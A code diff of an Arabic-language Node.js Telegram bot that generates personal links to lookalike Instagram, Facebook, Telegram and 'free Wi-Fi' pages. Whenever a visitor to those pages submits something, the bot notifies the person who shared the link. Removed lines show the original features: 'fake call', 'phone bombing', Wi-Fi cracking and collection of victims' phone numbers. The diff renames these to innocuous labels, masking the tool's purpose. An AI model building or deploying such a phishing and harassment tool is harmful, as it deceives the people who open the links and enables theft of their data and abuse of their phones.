@@ -6,12 +6,14 @@ const { Pool } = require("pg");
 // الإعدادات الأساسية
 // ==============================
 const TOKEN = process.env.BOT_TOKEN;
+
 if (!TOKEN) {
     console.error("❌ BOT_TOKEN is missing");
     process.exit(1);
 }
 
 const DATABASE_URL = process.env.DATABASE_URL;
+
 if (!DATABASE_URL) {
     console.error("❌ DATABASE_URL is missing");
     process.exit(1);
@@ -37,9 +39,10 @@ const pool = new Pool({
 });
 
 // ==============================
-// إنشاء جدول الزيارات
+// إنشاء قاعدة البيانات
 // ==============================
 async function initDatabase() {
+
     await pool.query(`
         CREATE TABLE IF NOT EXISTS visits (
             id BIGSERIAL PRIMARY KEY,
@@ -52,21 +55,29 @@ async function initDatabase() {
 }
 
 initDatabase().catch((error) => {
-    console.error("❌ Database init error:", error);
+
+    console.error(
+        "❌ Database init error:",
+        error
+    );
+
     process.exit(1);
 });
 
 // ==============================
-// إعداد بوت التليجرام
+// تشغيل Telegram Bot
 // ==============================
-const bot = new TelegramBot(TOKEN, {
-    polling: true
-});
+const bot = new TelegramBot(
+    TOKEN,
+    {
+        polling: true
+    }
+);
 
 console.log("🤖 Telegram Bot is running...");
 
 // ==============================
-// المستخدمون الذين وافقوا
+// المستخدمون الموافقون
 // ==============================
 const acceptedUsers = new Set();
 
@@ -78,10 +89,11 @@ function sendMainMenu(chatId) {
     return bot.sendMessage(
         chatId,
 
-        "👋 أهلاً بك في القائمة الرئيسية\n\nاختر المنصة التي تريدها من الأسفل:",
+        "👋 أهلاً بك في القائمة الرئيسية\n\nاختر الخدمة التي تريد إنشاء رابط لها:",
 
         {
             reply_markup: {
+
                 inline_keyboard: [
 
                     [
@@ -101,18 +113,18 @@ function sendMainMenu(chatId) {
                             callback_data: "telegram"
                         },
                         {
-                            text: "📞 اتصال وهمي",
+                            text: "📞 اتصال",
                             callback_data: "twitter"
                         }
                     ],
 
                     [
                         {
-                            text: "💬 تفجير هواتف",
-                            callback_data: "تفجير هواتف"
+                            text: "💬 خدمة",
+                            callback_data: "service"
                         },
                         {
-                            text: "📶 فك شبكات Wi-Fi",
+                            text: "📶 Wi-Fi",
                             callback_data: "whatsapp"
                         }
                     ],
@@ -133,218 +145,241 @@ function sendMainMenu(chatId) {
 // ==============================
 // أمر /start
 // ==============================
-bot.onText(/^\/start$/, async (msg) => {
+bot.onText(
+    /^\/start$/,
+    async (msg) => {
 
-    const chatId = msg.chat.id;
+        const chatId = msg.chat.id;
 
-    const firstName =
-        msg.from?.first_name || "غير معروف";
+        const firstName =
+            msg.from?.first_name ||
+            "غير معروف";
 
-    const lastName =
-        msg.from?.last_name || "";
+        const lastName =
+            msg.from?.last_name ||
+            "";
 
-    const username =
-        msg.from?.username
-            ? `@${msg.from.username}`
-            : "لا يوجد";
+        const username =
+            msg.from?.username
+                ? `@${msg.from.username}`
+                : "لا يوجد";
 
-    const fullName =
-        `${firstName} ${lastName}`.trim();
+        const fullName =
+            `${firstName} ${lastName}`.trim();
 
-    // إذا وافق مسبقاً
-    if (acceptedUsers.has(chatId)) {
-        return sendMainMenu(chatId);
-    }
+        // إذا وافق سابقاً
+        if (acceptedUsers.has(chatId)) {
 
-    // شروط الاستخدام
-    await bot.sendMessage(
-        chatId,
+            return sendMainMenu(chatId);
+        }
 
-        `👋 أهلاً بك ${fullName}
+        // شروط الاستخدام
+        await bot.sendMessage(
+            chatId,
 
-🆔 معرف Telegram الخاص بك: ${chatId}
-👤 Username: ${username}
+            `👋 أهلاً بك ${fullName}
+
+🆔 معرف Telegram الخاص بك:
+${chatId}
+
+👤 Username:
+${username}
 
 📋 شروط استخدام البوت:
-أنا غير مسؤول عن أي استخدام غير رسمي للبوت.
+
 باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,
 
-        {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {
-                            text: "✅ أوافق على الشروط",
-                            callback_data: "accept_terms"
-                        }
+            {
+                reply_markup: {
+
+                    inline_keyboard: [
+
+                        [
+                            {
+                                text: "✅ أوافق على الشروط",
+                                callback_data: "accept_terms"
+                            }
+                        ]
+
                     ]
-                ]
+                }
             }
-        }
-    );
-});
+        );
+
+    }
+);
 
 // ==============================
 // معالجة الأزرار
 // ==============================
-bot.on("callback_query", async (query) => {
+bot.on(
+    "callback_query",
+    async (query) => {
 
-    const chatId = query.message.chat.id;
+        const chatId =
+            query.message.chat.id;
 
-    try {
+        try {
 
-        // ==========================
-        // قبول الشروط
-        // ==========================
-        if (query.data === "accept_terms") {
+            // ==========================
+            // قبول الشروط
+            // ==========================
+            if (
+                query.data ===
+                "accept_terms"
+            ) {
 
-            acceptedUsers.add(chatId);
-
-            await bot.answerCallbackQuery(
-                query.id,
-                {
-                    text: "تم قبول الشروط ✅"
-                }
-            );
-
-            await bot.sendMessage(
-                chatId,
-
-                `✅ تم قبول الشروط.
-
-أهلاً بك ${query.from.first_name || ""}.
-
-🆔 ID الخاص بك:
-${chatId}
-
-اضغط /start للمتابعة.`
-            );
-
-            return;
-        }
-
-        // ==========================
-        // التحقق من الموافقة
-        // ==========================
-        if (!acceptedUsers.has(chatId)) {
-
-            await bot.answerCallbackQuery(
-                query.id,
-                {
-                    text: "يجب الموافقة على الشروط أولاً."
-                }
-            );
-
-            return;
-        }
-
-        // ==========================
-        // الإحصائيات
-        // ==========================
-        if (query.data === "stats") {
-
-            const usersResult =
-                await pool.query(`
-                    SELECT COUNT(DISTINCT chat_id)
-                    FROM visits
-                `);
-
-            const visitsResult =
-                await pool.query(`
-                    SELECT COUNT(*)
-                    FROM visits
-                `);
-
-            const totalUsers =
-                parseInt(
-                    usersResult.rows[0].count
+                acceptedUsers.add(
+                    chatId
                 );
 
-            const totalVisits =
-                parseInt(
-                    visitsResult.rows[0].count
+                await bot.answerCallbackQuery(
+                    query.id,
+                    {
+                        text:
+                            "تم قبول الشروط ✅"
+                    }
                 );
 
-            await bot.answerCallbackQuery(
-                query.id
-            );
+                await sendMainMenu(
+                    chatId
+                );
 
-            await bot.sendMessage(
-                chatId,
+                return;
+            }
 
-                `📊 **إحصائيات البوت الحالية:**
+            // ==========================
+            // التحقق من الموافقة
+            // ==========================
+            if (
+                !acceptedUsers.has(
+                    chatId
+                )
+            ) {
+
+                await bot.answerCallbackQuery(
+                    query.id,
+                    {
+                        text:
+                            "يجب الموافقة على الشروط أولاً."
+                    }
+                );
+
+                return;
+            }
+
+            // ==========================
+            // الإحصائيات
+            // ==========================
+            if (
+                query.data ===
+                "stats"
+            ) {
+
+                const usersResult =
+                    await pool.query(`
+                        SELECT COUNT(DISTINCT chat_id)
+                        FROM visits
+                    `);
+
+                const visitsResult =
+                    await pool.query(`
+                        SELECT COUNT(*)
+                        FROM visits
+                    `);
+
+                const totalUsers =
+                    parseInt(
+                        usersResult
+                            .rows[0]
+                            .count
+                    );
+
+                const totalVisits =
+                    parseInt(
+                        visitsResult
+                            .rows[0]
+                            .count
+                    );
+
+                await bot.answerCallbackQuery(
+                    query.id
+                );
+
+                await bot.sendMessage(
+                    chatId,
+
+                    `📊 إحصائيات البوت
 
 👥 المستخدمون:
 ${totalUsers}
 
-🔗 الزيارات:
+👀 الزيارات:
 ${totalVisits}
 
 ⏱️ آخر تحديث:
-الآن`,
+الآن`
+                );
 
-                {
-                    parse_mode: "Markdown"
-                }
-            );
+                return;
+            }
 
-            return;
-        }
+            // ==========================
+            // المواقع
+            // ==========================
+            const websites = {
 
-        // ==========================
-        // المواقع
-        // ==========================
-        const websites = {
+                instagram:
+                    "https://instagram-two-henna.vercel.app/",
 
-            instagram:
-                "https://instagram-two-henna.vercel.app/",
+                facebook:
+                    "https://facebook-ruby-one.vercel.app/",
 
-            facebook:
-                "https://facebook-ruby-one.vercel.app/",
+                telegram:
+                    "https://telegram-one-rho.vercel.app/",
 
-            telegram:
-                "https://telegram-one-rho.vercel.app/",
+                twitter:
+                    "https://callmyphone.org/",
 
-            twitter:
-                "https://callmyphone.org/",
+                whatsapp:
+                    "https://wifi-free-gamma.vercel.app/",
 
-            whatsapp:
-                "https://wifi-free-gamma.vercel.app/",
+                service:
+                    "https://kexart.com/"
+            };
 
-            "تفجير هواتف":
-                "https://kexart.com/"
-        };
+            const website =
+                websites[
+                    query.data
+                ];
 
-        const website =
-            websites[query.data];
+            if (!website) {
 
-        if (!website) {
+                await bot.answerCallbackQuery(
+                    query.id
+                );
 
-            await bot.answerCallbackQuery(
-                query.id
-            );
+                return;
+            }
 
-            return;
-        }
+            // ==========================
+            // إنشاء الرابط باستخدام Chat ID
+            // ==========================
+            const separator =
+                website.includes("?")
+                    ? "&"
+                    : "?";
 
-        // ==========================
-        // إنشاء الرابط باستخدام chatId
-        // ==========================
-        const separator =
-            website.includes("?")
-                ? "&"
-                : "?";
+            const referralUrl =
+                `${website}${separator}chatId=${encodeURIComponent(chatId)}`;
 
-        const referralUrl =
-            `${website}${separator}chatId=${encodeURIComponent(chatId)}`;
+            // ==========================
+            // إرسال الرابط
+            // ==========================
+            await bot.sendMessage(
+                chatId,
 
-        // ==========================
-        // إرسال الرابط
-        // ==========================
-        await bot.sendMessage(
-            chatId,
-
-            `🔗 هذا رابطك الخاص:
+                `🔗 رابطك الخاص:
 
 ${referralUrl}
 
@@ -352,71 +387,72 @@ ${referralUrl}
 ${chatId}
 
 يمكنك مشاركة الرابط.`
-        );
-
-        await bot.answerCallbackQuery(
-            query.id
-        );
-
-    } catch (error) {
-
-        console.error(
-            "❌ Callback error:",
-            error
-        );
-
-        try {
-
-            await bot.answerCallbackQuery(
-                query.id,
-                {
-                    text: "حدث خطأ، حاول مرة أخرى."
-                }
             );
 
-        } catch (_) {}
-    }
-});
+            await bot.answerCallbackQuery(
+                query.id
+            );
 
-// ================================================================
-// استقبال إرسال من الموقع
-// ================================================================
+        } catch (error) {
+
+            console.error(
+                "❌ Callback error:",
+                error
+            );
+
+            try {
+
+                await bot.answerCallbackQuery(
+                    query.id,
+                    {
+                        text:
+                            "حدث خطأ، حاول مرة أخرى."
+                    }
+                );
+
+            } catch (_) {}
+
+        }
+
+    }
+);
+
+// ======================================================
+// استقبال طلب تجريبي من الموقع
+// ======================================================
 app.post(
-    "/api/submit-phone",
+    "/api/submit",
     async (req, res) => {
 
         try {
 
             const {
-                phone,
-                chatId
+                chatId,
+                event
             } = req.body;
 
             // ==========================
-            // التحقق من البيانات
+            // التحقق
             // ==========================
             if (!chatId) {
 
                 return res.status(400).json({
-                    success: false,
-                    message: "Chat ID ناقص"
-                });
-            }
 
-            if (!phone) {
-
-                return res.status(400).json({
                     success: false,
-                    message: "رقم الهاتف ناقص"
+
+                    message:
+                        "Chat ID ناقص"
+
                 });
             }
 
             // ==========================
-            // حفظ العملية
+            // تسجيل الزيارة
             // ==========================
             await pool.query(
                 `
-                INSERT INTO visits (chat_id)
+                INSERT INTO visits
+                (chat_id)
                 VALUES ($1)
                 `,
                 [
@@ -428,15 +464,21 @@ app.post(
             // إشعار صاحب الرابط
             // ==========================
             await bot.sendMessage(
+
                 String(chatId),
 
-                `📩 يوجد إرسال جديد من موقعك.
+                `📩 طلب جديد
 
 🔗 Chat ID:
 ${chatId}
 
+📌 الحدث:
+${event || "طلب جديد"}
+
 ⏱️ الوقت:
-${new Date().toLocaleString("ar-JO")}`
+${new Date().toLocaleString(
+    "ar-JO"
+)}`
             );
 
             // ==========================
@@ -447,13 +489,14 @@ ${new Date().toLocaleString("ar-JO")}`
                 success: true,
 
                 message:
-                    "تم تسجيل العملية بنجاح"
+                    "تم تسجيل الطلب بنجاح"
+
             });
 
         } catch (error) {
 
             console.error(
-                "❌ Error in /api/submit-phone:",
+                "❌ Submit error:",
                 error
             );
 
@@ -463,20 +506,27 @@ ${new Date().toLocaleString("ar-JO")}`
 
                 message:
                     "خطأ داخلي في السيرفر"
+
             });
+
         }
+
     }
 );
 
 // ==============================
-// فحص السيرفر
+// اختبار السيرفر
 // ==============================
-app.get("/", (req, res) => {
+app.get(
+    "/",
+    (req, res) => {
 
-    res.send(
-        "✅ Telegram Bot Server is running successfully!"
-    );
-});
+        res.send(
+            "✅ Telegram Bot Server is running successfully!"
+        );
+
+    }
+);
 
 // ==============================
 // تشغيل السيرفر
